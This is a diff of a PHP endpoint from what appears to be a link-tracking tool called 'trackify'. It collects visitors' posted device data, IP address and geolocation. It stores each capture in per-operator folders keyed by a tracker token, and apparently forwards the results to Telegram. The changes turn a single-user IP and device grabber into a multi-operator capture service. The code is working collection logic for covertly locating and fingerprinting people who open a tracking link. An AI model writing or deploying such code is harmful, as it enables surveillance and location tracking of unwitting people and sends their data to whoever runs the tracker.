@@ -1,13 +1,17 @@
 <?php
 
-// Include geolocation helper
+declare(strict_types=1);
+
 require_once 'geo.php';
+require_once __DIR__ . '/trackify_capture.php';
 
 // Receive device information from client
 if (!empty($_POST['device_data'])) {
     $deviceData = json_decode($_POST['device_data'], true);
-    
-    if ($deviceData) {
+    $tid = $_POST['tid'] ?? '';
+    $ownerId = trackify_user_id_for_token($tid);
+
+    if ($deviceData && $ownerId !== null) {
         // Get IP address
         if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
             $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
@@ -20,9 +24,9 @@ if (!empty($_POST['device_data'])) {
         // Get IP geolocation
         $geo = getIPLocation($ipaddress);
         
-        // Save geolocation data
         if ($geo) {
-            saveGeoData($ipaddress, $geo);
+            $geoFile = trackify_user_capture_dir($ownerId) . '/geolocations.json';
+            saveGeoData($ipaddress, $geo, $geoFile, $ownerId);
         }
         
         // Format device information
@@ -122,14 +126,9 @@ if (!empty($_POST['device_data'])) {
         
         $info .= "═══════════════════════════════════\n";
         
-        // Save to file
-        $file = 'ip.txt';
-        $fp = fopen($file, 'a');
-        fwrite($fp, $info);
-        fclose($fp);
-        
-        // Append to saved IPs
-        file_put_contents('saved.ip.txt', $info, FILE_APPEND);
+        $capDir = trackify_user_capture_dir($ownerId);
+        file_put_contents($capDir . '/ip_pending.txt', $info, LOCK_EX);
+        file_put_contents($capDir . '/saved.ip.txt', $info, FILE_APPEND | LOCK_EX);
         
         // Send to Telegram if configured
         // Try to load from config file
@@ -214,10 +213,9 @@ if (!empty($_POST['device_data'])) {
             @file_get_contents($url, false, $context);
         }
         
-        // Return success
         echo json_encode(['status' => 'success']);
     } else {
-        echo json_encode(['status' => 'error', 'message' => 'Invalid JSON data']);
+        echo json_encode(['status' => 'error', 'message' => 'Invalid data or missing tracker id']);
     }
 } else {
     echo json_encode(['status' => 'error', 'message' => 'No data received']);
